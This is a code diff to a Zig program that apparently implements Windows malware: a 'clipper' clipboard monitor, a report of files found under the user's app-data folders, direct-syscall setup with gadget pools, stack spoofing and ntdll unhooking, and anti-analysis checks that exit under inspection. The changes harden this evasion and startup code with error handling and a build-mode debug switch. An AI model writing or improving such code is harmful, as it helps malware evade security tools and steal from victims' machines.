@@ -46,7 +46,9 @@ const clipper_config = @import("clipper_config");
 const clipboard_monitor = @import("clipper/clipboard_monitor.zig");
 const clipper_log_mod = @import("clipper/log.zig");
 
-const is_debug = true;
+// ponytail: is_debug controls debug/test vs production pipeline
+// Set to false for production builds, true for debugging
+const is_debug = !@import("builtin").mode.isOptimized();
 
 fn assert(ok: bool, comptime label: []const u8) void {
     if (ok) {
@@ -313,7 +315,9 @@ fn buildReport(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
         report.appendSlice(": ") catch {};
         if (g.found) {
             report.appendSlice("found (") catch {};
-            report.appendSlice(std.fmt.allocPrint(allocator, "{d}", .{g.file_count}) catch "0") catch {};
+            var count_buf: [16]u8 = undefined;
+            const count_str = std.fmt.bufPrint(&count_buf, "{d}", .{g.file_count}) catch "0";
+            report.appendSlice(count_str) catch {};
             report.appendSlice(" files)\n") catch {};
         } else {
             report.appendSlice("not found\n") catch {};
@@ -359,7 +363,10 @@ fn initSyscallInfrastructure() ?types.PVOID {
         logMsg("[!] engine.resolve() failed\n");
         return null;
     }
-    _ = gadget.initialize();
+    if (!gadget.initialize()) {
+        logMsg("[!] Gadget pool initialization failed\n");
+        return null;
+    }
     _ = stack_spoof.initialize();
     _ = ntdll_unhook.unhookNtdll();
     _ = engine.resolveWin32u();
@@ -367,7 +374,10 @@ fn initSyscallInfrastructure() ?types.PVOID {
 }
 
 fn initAntiEvasion(ntdll: types.PVOID) bool {
-    _ = mutex.ensureMutex();
+    if (!mutex.ensureMutex()) {
+        logMsg("[!] Another instance is already running\n");
+        return false;
+    }
     const analysis = anti_analysis.runAll();
     if (anti_analysis.shouldExit(analysis)) {
         logMsg("[!] Unsafe environment detected, exiting\n");
